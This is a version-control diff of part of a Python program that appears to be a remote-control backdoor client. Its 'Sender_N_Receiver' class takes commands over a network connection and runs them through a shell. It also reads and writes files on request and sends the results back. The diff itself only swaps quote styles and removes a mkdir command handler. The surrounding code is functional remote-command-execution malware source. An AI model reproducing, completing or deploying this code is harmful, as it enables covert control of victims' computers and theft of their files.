@@ -25,7 +25,7 @@ class Sender_N_Receiver:
             self.make_connection()
 
         def reliable_send(self, data):
-            json_data = json.dumps(data.decode('utf-8'))
+            json_data = json.dumps(data.decode("utf-8"))
             self.connection.send(bytes(json_data, 'utf-8'))
 
         def reliable_recieve(self):
@@ -42,14 +42,7 @@ class Sender_N_Receiver:
                 return subprocess.check_output(command_given, shell=True)
             except Exception:
                 return b"[-]invaid command"
-
-        def make_directory(self, path):
-            try:
-                os.mkdir(path)
-                return b"[+]successfully Created"
-            except OSError as error:
-                return b"[-]error"
-
+            
         def change_working_directory(self, path):
             try:
                 os.chdir(path)
@@ -83,8 +76,6 @@ class Sender_N_Receiver:
                     output = self.read_files(command[1])
                 elif command[0] == "upload":
                     output = self.write_files(command[1], command[2])
-                elif command[0] == "mkdir":
-                    output = self.make_directory(command[1])
                 else:
                     output = self.execute_commands(command)
                 self.reliable_send(output)
